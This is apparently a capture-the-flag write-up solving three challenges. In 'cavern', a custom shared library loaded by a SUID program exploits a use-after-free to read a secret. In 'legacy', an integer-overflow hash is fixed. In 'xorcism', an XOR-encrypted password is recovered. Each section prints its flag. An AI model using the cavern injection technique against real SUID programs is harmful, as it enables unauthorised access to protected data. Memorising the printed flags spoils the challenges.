## • cavern

The main point is that after the memory is released, it remains readable and still holds the data.

Found that `cavern` is a SUID executable that loads our shared library and calls `run()`

Created `offer.c` to find the `guess()` function and read the secret from memory after it was freed

function run can be added to shared library to program
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>


void run(void) {
    void *(*guess)(const char *) = dlsym(RTLD_DEFAULT, "guess"); //via it can call guess without code of guess

    if (!guess) {
        puts("guess not found");
        return;
    }

    char *ptr = guess("wrong");
    printf("Secret: %.64s\n", ptr + 64);
}
```

Compiled the C file into a shared library and passed it to `cavern`

```bash
gcc -shared -fPIC -o offer.so offer.c -ldl
./cavern ./offer.so
```

The `guess()` function rejected the incorrect answer but returned a pointer to memory containing the secret

The `secret` array was located 64 bytes after the beginning of the structure, and its contents remained readable after the memory was freed

Used this Use-After-Free vulnerability to retrieve the flag

```text
cctf{RemeMb3R_Th3Re_1s_No_5PooN_freE_FRom_nas4l_demon5}
```

## • legacy

Downloaded the provided `legacy.c` source file and examined the `position()` function

The program was originally written for a system where `unsigned` was 18 bits long, while modern systems typically use 32-bit `unsigned`

The original hash calculation was:

```c
h = h * 67 + *s++;
```

On the original system, arithmetic overflow discarded all bits beyond the lowest 18 bits, but on a modern system the hash calculation produced different values, causing out-of-bounds access to `document[69]` and a segmentation fault

Modified the calculation to reproduce 18-bit unsigned overflow using a bitwise AND mask:

```c
h = (h * 67 + *s++) & 0x3FFFF; #por always getting old value of h
```

Applied the modification directly from the terminal:

```bash
sed -i '' 's/h = h \* 67 + \*s++;/h = (h * 67 + *s++) \& 0x3FFFF;/' legacy.c //to change line of converting 
```

Compiled and executed the corrected program:

```bash
gcc legacy.c -o legacy
./legacy
```
The program successfully decrypted the document and revealed the flag:

```text
cctf{7H3_Good_old_D4ys_With_G0oD_OLD_C}
```

## • xorcism

Examined the provided `demon.c` source code and found that the program stores an encrypted password in the `enc` array and a four-byte XOR key in the `key` array

The program checks each password character using the following expression:

```c
enc[i] ^ key[i % 4]
```

Since XOR is reversible, the original password can be recovered by applying XOR to each encrypted byte using the same key

The expression `i % 4` repeats the four-byte key throughout the 33-byte password

Recovered the password from the encrypted data:

```text
p1eAs3_D0nT_F3ed_the_N45A1_DemoNs //got it via 33 times xor operation
```

Compiled the original program:

```bash
gcc demon.c -o demon
```

Passed the recovered password directly to the program through standard input:

```bash
printf '%s\n' 'p1eAs3_D0nT_F3ed_the_N45A1_DemoNs' | ./demon
```
The recovered flag was:

```text
cctf{p1eAs3_D0nT_F3ed_the_N45A1_DemoNs}
```